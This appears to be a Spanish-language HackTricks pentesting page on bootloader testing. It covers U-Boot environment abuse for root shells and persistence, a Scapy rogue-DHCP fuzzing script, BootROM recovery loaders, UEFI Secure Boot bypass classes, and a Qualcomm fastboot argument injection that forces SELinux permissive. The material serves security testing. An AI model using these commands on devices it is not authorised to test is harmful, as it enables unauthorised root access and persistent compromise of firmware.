# Pruebas de Bootloader

{{#include ../../banners/hacktricks-training.md}}

Se recomiendan los siguientes pasos para modificar las configuraciones de inicio de dispositivos y probar bootloaders como U-Boot y los loaders de clase UEFI. Concéntrate en obtener ejecución de código temprana, evaluar las protecciones de firma y rollback, y abusar de las rutas de recuperación o network-boot.

Relacionado: bypass de secure-boot de MediaTek mediante patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Quick wins de U-Boot y abuso del entorno

1. Acceder al shell del intérprete
- Durante el arranque, pulsa una tecla de interrupción conocida (a menudo cualquier tecla, 0, espacio o una secuencia "mágica" específica de la placa) antes de que se ejecute `bootcmd` para acceder al prompt de U-Boot.<sup>[[1]](#references)</sup>

2. Inspeccionar el estado y las variables de arranque
- Comandos útiles:
- `printenv` (volcar el entorno)
- `bdinfo` (información de la placa, direcciones de memoria)
- `help bootm; help booti; help bootz` (métodos de boot del kernel compatibles)
- `help ext4load; help fatload; help tftpboot` (loaders disponibles)

3. Modificar los argumentos de arranque para obtener un root shell
- Añade `init=/bin/sh` para que el kernel acceda a un shell en lugar de ejecutar el init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Hacer netboot desde tu servidor TFTP
- Configura la red y descarga un kernel/imagen fit desde la LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistir cambios mediante el entorno
- Si el almacenamiento del entorno no está protegido contra escritura, puedes persistir el control:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Comprueba variables como `bootcount`, `bootlimit`, `altbootcmd` y `boot_targets`, que influyen en las rutas de fallback. Los valores mal configurados pueden permitir interrupciones repetidas para acceder al shell.

6. Comprobar las funciones de debug/inseguras
- Busca: `bootdelay` > 0, `autoboot` deshabilitado, `usb start; fatload usb 0:1 ...` sin restricciones, posibilidad de usar `loady`/`loads` mediante serial, `env import` desde medios no confiables y kernels/ramdisks cargados sin comprobaciones de firma.

7. Pruebas de imágenes/verificación de U-Boot
- Si la plataforma afirma utilizar secure/verified boot con imágenes FIT, prueba imágenes unsigned y manipuladas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- La ausencia de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o el comportamiento heredado `verify=n` suele permitir el boot de payloads arbitrarios.
- No te detengas en un resultado simple de allow/deny: investigaciones recientes sobre FIT demostraron que la propia ruta de verificación puede ser una superficie de ataque pre-auth. Realiza pruebas negativas con datos FIT almacenados externamente (`data-offset`, `data-position`, `data-size`), selección de configuraciones firmadas, `loadables` y gestión de overlays / `extra-conf`.
- Si tienes un source tree coincidente, `test/vboot/vboot_test.sh` es una forma rápida de reproducir el comportamiento de verificación FIT en el sandbox de U-Boot antes de tocar hardware real.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` y bootflows basados en scripts
- En builds modernos de U-Boot, `bootcmd` suele ser simplemente un wrapper alrededor de Standard Boot. Esto significa que los medios con permisos de escritura, PXE o la SPI flash pueden convertirse en el límite de confianza real, incluso cuando el entorno visible parece inofensivo.
- El `bootmeth` de `extlinux` busca `extlinux/extlinux.conf` bajo `/` y `/boot`; el `bootmeth` de scripts busca primero `boot.scr.uimg` y después `boot.scr`. En network boot, el nombre del script puede proceder de `boot_script_dhcp`.
- Comandos útiles de triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Casos de abuso que deben probarse: medios USB/SD controlados por el atacante y situados antes en `boot_targets`, `/boot/extlinux/extlinux.conf` con permisos de escritura, un TFTP malicioso que proporcione `boot.scr` o ejecución de scripts respaldada por SPI mediante `script_offset_f`.
- Si la plataforma depende de la verificación FIT, asegúrate de que las configuraciones estén firmadas a nivel de configuración y no solo por imagen; `required-mode=all` es más robusto que aceptar cualquier clave requerida individual.

## Superficie de network boot (DHCP/PXE) y servidores maliciosos

9. Fuzzing de parámetros PXE/DHCP
- La gestión BOOTP/DHCP heredada de U-Boot ha tenido problemas de memory-safety. Por ejemplo, CVE‑2024‑42040 describe una divulgación de memoria mediante respuestas DHCP manipuladas que pueden filtrar bytes de la memoria de U-Boot a través de la red.<sup>[[4]](#references)</sup> Ejecuta pruebas sobre las rutas de código DHCP/PXE usando valores excesivamente largos o casos límite (option 67 bootfile-name, vendor options y campos file/servername) y observa posibles bloqueos/leaks.
- Snippet mínimo de Scapy para estresar los parámetros de boot durante el netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valida también si los campos de nombre de archivo PXE se pasan a la lógica del shell/loader sin sanitización cuando se encadenan con scripts de provisioning del lado del sistema operativo.

10. Pruebas de command injection mediante un servidor DHCP malicioso
- Configura un servicio DHCP/PXE malicioso e intenta inyectar caracteres en los campos de nombre de archivo u options para alcanzar intérpretes de comandos en etapas posteriores de la cadena de boot. El auxiliary de Metasploit para DHCP, `dnsmasq` o scripts personalizados de Scapy funcionan bien. Asegúrate primero de aislar la red del laboratorio.

## Modos de recuperación de SoC ROM que sobrescriben el boot normal

Muchos SoC exponen un modo "loader" de BootROM que acepta código mediante USB/UART incluso cuando las imágenes flash no son válidas. Si los fusibles de secure-boot no están activados, esto puede proporcionar ejecución de código arbitraria en una etapa muy temprana de la cadena.

- NXP i.MX (Serial Download Mode)
- Herramientas: `uuu` (mfgtools3) o `imx-usb-loader`.
- Ejemplo: `imx-usb-loader u-boot.imx` para enviar y ejecutar un U-Boot personalizado desde la RAM.
- Allwinner (FEL)
- Herramienta: `sunxi-fel`.
- Ejemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` o `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Herramienta: `rkdeveloptool`.
- Ejemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para cargar temporalmente un loader y subir un U-Boot personalizado.

Evalúa si el dispositivo tiene eFuses/OTP de secure-boot activados. Si no los tiene, los modos de descarga de BootROM suelen omitir cualquier verificación de nivel superior (U-Boot, kernel, rootfs) al ejecutar tu payload de primera etapa directamente desde SRAM/DRAM.

## Bootloaders de clase UEFI/PC: comprobaciones rápidas

11. Pruebas de manipulación del ESP, rollback y enrollment de claves
- Monta la EFI System Partition (ESP) y comprueba los componentes del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` y las rutas de los logos del vendor.
- Extrae el estado de Secure Boot y las bases de datos de claves desde el sistema operativo cuando sea posible:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Si la plataforma está en Setup Mode, acepta el enrollment de claves no autenticadas o incluye una Platform Key (PKfail class) de prueba/predeterminada, un admin local o un atacante con acceso físico puede inscribir su propia KEK/db y mantener Secure Boot aparentemente "enabled" mientras inicia binarios EFI arbitrarios.<sup>[[3]](#references)</sup>
- Intenta iniciar con componentes de boot downgraded o firmados conocidos por ser vulnerables si las revocaciones de Secure Boot (dbx) no están actualizadas. Si la plataforma todavía confía en shims/bootmanagers antiguos, a menudo puedes cargar tu propio kernel o `grub.cfg` desde el ESP para obtener persistencia.

12. Pruebas de revocación de shim / SBAT / dbx obsoletas
- Los shims antiguos firmados por Microsoft y los forks de vendors todavía pueden actuar como una ruta de bootkit al estilo BYOVD si las revocaciones están obsoletas. En un laboratorio aislado, coloca un shim históricamente vulnerable en el ESP e intenta hacer chainload de tu propio `grubx64.efi` o kernel.<sup>[[11]](#references)</sup>
- Triage rápido:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Si el shim sigue ejecutándose pese a estar en la lista de revocación, el firmware/OS tiene actualizaciones `dbx` obsoletas o confía en un loader forked que nunca heredó las protecciones SBAT upstream.

13. Bugs de parsing de boot logos (clase LogoFAIL)
- Varios firmwares OEM/IBV eran vulnerables a fallos de parsing de imágenes en DXE que procesaban boot logos. Si un atacante puede colocar una imagen manipulada en el ESP bajo una ruta específica del vendor (por ejemplo, `\EFI\<vendor>\logo\*.bmp`) y reiniciar, podría ser posible obtener ejecución de código durante el boot temprano incluso con Secure Boot enabled. Comprueba si la plataforma acepta logos proporcionados por el usuario y si esas rutas tienen permisos de escritura desde el sistema operativo.<sup>[[2]](#references)</sup>


## Gaps de confianza de Android/Qualcomm ABL + GBL (Android 16)

En dispositivos Android 16 que utilizan el ABL de Qualcomm para cargar la **Generic Bootloader Library (GBL)**, valida si ABL **autentica** la aplicación UEFI que carga desde la partición `efisp`. Si ABL solo comprueba la **presencia** de una aplicación UEFI y no verifica las firmas, una primitive de escritura en `efisp` se convierte en **ejecución de código unsigned pre-OS** durante el boot.<sup>[[6]](#references)[[7]](#references)</sup>

Comprobaciones y rutas de abuso prácticas:

- **primitive de escritura en efisp**: Necesitas una forma de escribir una aplicación UEFI personalizada en `efisp` (root/servicio privilegiado, bug en una aplicación OEM, ruta de recovery/fastboot). Sin esto, el gap de carga de GBL no es directamente alcanzable.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (bug de ABL): Algunos builds aceptan tokens adicionales en `fastboot oem set-gpu-preemption` y los añaden a la kernel cmdline. Esto puede utilizarse para forzar SELinux permissive, permitiendo escribir en particiones protegidas:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Si el dispositivo está parcheado, el comando debería rechazar argumentos adicionales.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock mediante flags persistentes**: Un payload de la etapa de boot puede modificar flags persistentes de unlock (por ejemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sin los controles de aprobación/servidor del OEM. Esto supone un cambio de postura duradero después del siguiente reinicio.<sup>[[6]](#references)</sup>

Notas defensivas/de triage:

- Confirma si ABL realiza verificación de firmas sobre el payload GBL/UEFI procedente de `efisp`. Si no lo hace, trata `efisp` como una superficie de persistencia de alto riesgo.
- Comprueba si los handlers fastboot OEM de ABL están parcheados para **validar el número de argumentos** y rechazar tokens adicionales.<sup>[[8]](#references)[[9]](#references)</sup>

## Precauciones de hardware

Ten cuidado al interactuar con SPI/NAND flash durante el boot temprano (por ejemplo, conectando pines a tierra para omitir lecturas) y consulta siempre la hoja de datos de la flash. Los cortocircuitos realizados en el momento incorrecto pueden corromper el dispositivo o el programmer.

## Notas y consejos adicionales

- Prueba `env export -t ${loadaddr}` y `env import -t ${loadaddr}` para mover blobs del entorno entre la RAM y el almacenamiento; algunas plataformas permiten importar el entorno desde medios extraíbles sin autenticación.
- Para obtener persistencia en sistemas basados en Linux que arrancan mediante `extlinux.conf`, modificar la línea `APPEND` (para inyectar `init=/bin/sh` o `rd.break`) en la boot partition suele ser suficiente cuando no se aplican comprobaciones de firma.
- Si el objetivo utiliza actualizaciones dual-slot / A/B, revisa las técnicas de anti-rollback y slot-desync en el [firmware analysis overview](README.md) para no pasar por alto gaps de confianza exclusivos del updater fuera del propio bootloader.
- Si el userland proporciona `fw_printenv/fw_setenv`, valida que `/etc/fw_env.config` coincida con el almacenamiento real del entorno. Los offsets mal configurados permiten leer/escribir la región MTD equivocada.

## Referencias

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
